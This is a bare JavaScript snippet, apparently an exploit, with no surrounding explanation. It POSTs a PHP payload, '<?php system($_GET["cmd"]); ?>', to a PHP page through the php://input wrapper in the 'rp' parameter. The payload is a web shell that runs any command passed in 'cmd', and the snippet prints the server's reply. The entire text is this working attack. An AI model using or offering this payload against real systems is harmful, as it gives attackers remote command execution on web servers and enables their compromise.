fetch('/index.php?rp=php://input', {
  method: 'POST',
  body: '<?php system($_GET["cmd"]); ?>'
}).then(r => r.text()).then(t => console.log(t));
